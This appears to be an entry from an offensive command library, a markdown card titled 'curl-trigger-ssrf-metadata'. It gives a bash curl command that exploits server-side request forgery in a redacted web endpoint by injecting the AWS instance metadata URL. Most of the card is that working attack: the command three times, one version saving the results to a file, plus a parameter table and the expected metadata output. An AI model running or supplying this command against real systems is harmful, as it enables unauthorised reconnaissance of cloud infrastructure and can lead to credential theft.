---
data: >-
  curl
  "https://█████/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/"
tags:
  - ssrf
  - recon
type: command
executor: bash
platforms:
  - Linux
  - Web
id: ac05d7a8-cafd-48e3-8eb4-90e80423ef72
created_at: '2025-12-14T03:46:09.160Z'
updated_at: '2025-12-14T03:46:09.160Z'
verified: false
validated: true
submitted: true
---
# curl-trigger-ssrf-metadata

## Command

```bash
curl "https://█████/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/"
```

## Description

This curl command triggers SSRF by requesting the target endpoint with an injected AWS metadata URL, fetching internal instance metadata.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-` | No flags; URL encoded in query | Yes |
| `url=...` | Target internal URL for SSRF | Yes |

## Examples

### Basic Usage

```bash
curl "https://█████/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/"
```

### Advanced Usage

```bash
curl -v "https://█████/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/" > metadata.txt
```

## Expected Output

Plain text or JSON list of metadata keys: ami-id\ninstance-id\nsecurity-groups\netc.

## Related

- [[Related Procedure]]
